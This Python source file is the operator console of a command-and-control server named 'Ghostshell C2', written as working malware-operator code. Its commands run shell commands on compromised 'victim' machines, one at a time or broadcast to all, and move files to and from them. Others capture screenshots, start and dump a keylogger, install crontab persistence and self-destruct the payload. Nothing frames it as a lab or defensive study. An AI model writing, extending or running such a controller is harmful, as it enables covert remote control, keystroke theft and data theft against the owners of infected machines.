import os
import sys
import base64
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.protocol import make_msg


class OperatorCLI(threading.Thread):
    def __init__(self, server):
        super().__init__()
        self.server = server
        self.current_client = None
        self.current_cid = None
        self.running = True
        self.daemon = True

    def run(self):
        self._print_banner()
        while self.running:
            try:
                raw = input(self._prompt())
            except (EOFError, KeyboardInterrupt):
                print()
                self.server.stop()
                break
            if not raw:
                continue
            parts = raw.strip().split()
            cmd = parts[0].lower()
            args = parts[1:]

            if self.current_client:
                self._handle_interact_cmd(cmd, args)
            else:
                self._handle_top_cmd(cmd, args)

    def _prompt(self):
        if self.current_client:
            return f"gs({self.current_cid})> "
        return "gs> "

    def _print_banner(self):
        print("=" * 50)
        print("  Ghostshell C2 Server")
        print(f"  Listening on {self.server.host}:{self.server.port}")
        print("  Type 'help' for commands")
        print("=" * 50)

    # --- Top-level commands ---

    def _handle_top_cmd(self, cmd, args):
        if cmd == "help":
            self._cmd_help()
        elif cmd == "list":
            self._cmd_list()
        elif cmd == "interact":
            self._cmd_interact(args)
        elif cmd == "broadcast":
            self._cmd_broadcast(args)
        elif cmd in ("exit", "quit"):
            self.server.stop()
            self.running = False
        elif cmd == "kill":
            self._cmd_kill(args)
        else:
            print(f"Unknown command: {cmd} (type 'help')")

    def _cmd_help(self):
        print("""
Top-level commands:
  list                      List connected clients
  interact <client_id>      Enter interactive session with a client
  broadcast <command>       Send shell command to all clients
  kill <client_id>          Disconnect a client
  exit / quit               Shutdown server
""")

    def _cmd_list(self):
        clients = self.server.list_clients()
        if not clients:
            print("[*] No clients connected.")
            return
        print(f"\n{'ID':<18} {'Hostname':<20} {'IP':<18} {'OS':<15}")
        print("-" * 71)
        for c in clients:
            print(f"{c['id']:<18} {c['hostname']:<20} {c['ip']:<18} {c['os']:<15}")
        print()

    def _cmd_interact(self, args):
        if not args:
            print("Usage: interact <client_id>")
            return
        cid = args[0]
        handler = self.server.get_client(cid)
        if not handler:
            print(f"[!] Client '{cid}' not found.")
            return
        self.current_client = handler
        self.current_cid = cid
        print(f"[*] Interacting with {cid} ({handler.info.get('hostname', '?')}). Type 'back' to return.")

    def _cmd_broadcast(self, args):
        if not args:
            print("Usage: broadcast <command>")
            return
        cmd = " ".join(args)
        msg = make_msg("cmd", {"command": cmd, "timeout": 30})
        with self.server.lock:
            for handler in self.server.clients.values():
                handler.send(msg)
        print(f"[*] Broadcast '{cmd}' to {len(self.server.clients)} client(s)")

    def _cmd_kill(self, args):
        if not args:
            print("Usage: kill <client_id>")
            return
        cid = args[0]
        handler = self.server.get_client(cid)
        if not handler:
            print(f"[!] Client '{cid}' not found.")
            return
        handler.close()
        self.server.unregister_client(cid)
        print(f"[*] Disconnected {cid}")

    # --- Interactive-mode commands ---

    def _handle_interact_cmd(self, cmd, args):
        if cmd == "help":
            self._cmd_interact_help()
        elif cmd == "back":
            self.current_client = None
            self.current_cid = None
            print("[*] Returned to top-level.")
        elif cmd == "info":
            self._cmd_info()
        elif cmd in ("shell", "exec"):
            self._cmd_shell(args)
        elif cmd == "upload":
            self._cmd_upload(args)
        elif cmd == "download":
            self._cmd_download(args)
        elif cmd == "screenshot":
            self._cmd_screenshot()
        elif cmd == "keylog_start":
            self._cmd_keylog_start()
        elif cmd == "keylog_stop":
            self._cmd_keylog_stop()
        elif cmd == "keylog_dump":
            self._cmd_keylog_dump()
        elif cmd == "persist_install":
            self._cmd_persist_install(args)
        elif cmd == "persist_remove":
            self._cmd_persist_remove()
        elif cmd == "cleanup":
            self._cmd_cleanup()
        elif cmd == "heartbeat":
            self._cmd_heartbeat()
        else:
            print(f"Unknown command: {cmd} (type 'help')")

    def _cmd_interact_help(self):
        print("""
Interactive commands:
  info                          Show client metadata
  shell / exec <command>        Execute remote command
  upload <local> <remote>       Upload file to victim
  download <remote> [local]     Download file from victim
  screenshot                    Capture victim screen (PNG)
  keylog_start                  Start keystroke logger
  keylog_stop                   Stop keystroke logger
  keylog_dump                   Retrieve captured keystrokes
  persist_install [interval]    Install crontab persistence (default 5 min)
  persist_remove                Remove crontab persistence
  cleanup                       Self-destruct payload on victim
  heartbeat                     Send liveness check
  back                          Return to top-level
""")

    def _cmd_info(self):
        info = self.current_client.info
        print(f"""
  Client ID:    {self.current_cid}
  Hostname:     {info.get('hostname', '?')}
  Username:     {info.get('username', '?')}
  OS:           {info.get('os', '?')}
  PID:          {info.get('pid', '?')}
  IP:           {info.get('ip_addr', '?')}
""")

    def _cmd_shell(self, args):
        if not args:
            print("Usage: shell <command>")
            return
        cmd = " ".join(args)
        msg = make_msg("cmd", {"command": cmd, "timeout": 30})
        self.current_client.send(msg)

    def _cmd_upload(self, args):
        if len(args) < 2:
            print("Usage: upload <local_path> <remote_path>")
            return
        local, remote = args[0], args[1]
        if not os.path.exists(local):
            print(f"[!] Local file not found: {local}")
            return
        try:
            with open(local, "rb") as f:
                content = base64.b64encode(f.read()).decode()
        except Exception as e:
            print(f"[!] Failed to read file: {e}")
            return
        msg = make_msg("upload", {"path": remote, "content": content})
        self.current_client.send(msg)
        print(f"[*] Uploading {local} -> {remote} ...")

    def _cmd_download(self, args):
        if not args:
            print("Usage: download <remote_path> [local_path]")
            return
        remote = args[0]
        msg = make_msg("download", {"path": remote})
        self.current_client.send(msg)
        print(f"[*] Requesting {remote} ...")

    def _cmd_screenshot(self):
        msg = make_msg("screenshot", {})
        self.current_client.send(msg)
        print("[*] Screenshot requested...")

    def _cmd_keylog_start(self):
        msg = make_msg("keylog_start", {})
        self.current_client.send(msg)
        print("[*] Keylogger start requested...")

    def _cmd_keylog_stop(self):
        msg = make_msg("keylog_stop", {})
        self.current_client.send(msg)
        print("[*] Keylogger stop requested...")

    def _cmd_keylog_dump(self):
        msg = make_msg("keylog_dump", {})
        self.current_client.send(msg)
        print("[*] Keylog dump requested...")

    def _cmd_persist_install(self, args):
        interval = int(args[0]) if args else 5
        msg = make_msg("persist_install", {"interval_minutes": interval})
        self.current_client.send(msg)
        print(f"[*] Persistence install requested (interval={interval} min)...")

    def _cmd_persist_remove(self):
        msg = make_msg("persist_remove", {})
        self.current_client.send(msg)
        print("[*] Persistence remove requested...")

    def _cmd_cleanup(self):
        resp = input("[!] This will remove payload from victim. Continue? (y/N): ")
        if resp.lower() != "y":
            return
        msg = make_msg("cleanup", {})
        self.current_client.send(msg)
        print("[*] Cleanup requested...")
        self.current_client = None
        self.current_cid = None

    def _cmd_heartbeat(self):
        msg = make_msg("heartbeat", {})
        self.current_client.send(msg)
        print("[*] Heartbeat sent...")
